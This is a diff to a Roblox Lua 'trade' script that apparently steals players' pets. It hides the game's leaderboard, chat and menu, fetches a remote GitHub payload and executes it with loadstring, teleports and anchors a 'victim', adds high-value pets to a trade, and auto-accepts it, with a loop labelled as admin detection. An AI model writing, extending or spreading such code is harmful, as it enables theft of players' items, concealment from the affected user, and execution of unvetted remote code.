@@ -1,4 +1,4 @@
--- [[ MONDEUR ELITE v15.9 - "YUKIHE" STABLE ]] --
+-- [[ MONDEUR ELITE v16.0 - "YUKIHEY" BUILD ]] --
 if _G.__Ran then return end
 _G.__Ran = true
 
@@ -7,19 +7,21 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local StarterGui = game:GetService("StarterGui")
 local LocalPlayer = Players.LocalPlayer
 
--- 1. IMMEDIATE UI TRIGGER (No Waiting)
+-- [[ 1. IMMEDIATE UI LOCKDOWN ]] --
 task.spawn(function()
     pcall(function()
+        -- Kill Leaderboard, Chat, and Menu instantly
         StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+        
+        -- Load your V.1 Loading Screen
         local uiCode = game:HttpGet("https://raw.githubusercontent.com/charles1384/ADM/main/V.1")
         loadstring(uiCode)()
     end)
 end)
 
--- 2. CORRECTED API (Fixed for 2026 Update)
--- We use a short wait so the script doesn't freeze if the API is slow
-local API = ReplicatedStorage:WaitForChild("API", 10)
-local TradeFolder = API and API:WaitForChild("Trade", 10)
+-- [[ 2. CORRECTED 2026 API PATHS ]] --
+local API = ReplicatedStorage:WaitForChild("API", 15)
+local TradeFolder = API and API:WaitForChild("Trade", 15)
 
 local function executeTrade(targetPlayer)
     if not TradeFolder then return end
@@ -28,7 +30,7 @@ local function executeTrade(targetPlayer)
     local inventory = ClientData.get_data().inventory
     
     if inventory and inventory.pets then
-        -- Teleport & Lockdown
+        -- Teleport & Anchor Victim
         pcall(function()
             local hrp = LocalPlayer.Character:WaitForChild("HumanoidRootPart", 5)
             local targetHrp = targetPlayer.Character:WaitForChild("HumanoidRootPart", 5)
@@ -40,6 +42,7 @@ local function executeTrade(targetPlayer)
             end
         end)
 
+        -- Ultra-Fast Item Add
         for _, petData in pairs(inventory.pets) do
             local val = _G.GetTrueValue(petData, _G.PetValueDB) or 0
             if val >= (getgenv().THRESHOLD or 0) then
@@ -49,6 +52,7 @@ local function executeTrade(targetPlayer)
             end
         end
         
+        -- Auto Accept Sequence
         task.wait(0.5)
         TradeFolder:WaitForChild("ReadyTrade"):FireServer(true)
         task.wait(0.2)
@@ -56,7 +60,7 @@ local function executeTrade(targetPlayer)
     end
 end
 
--- MAIN LOOP
+-- MAIN LOOP (Admin Detection)
 task.spawn(function()
     while task.wait(0.5) do
         if TradeFolder then
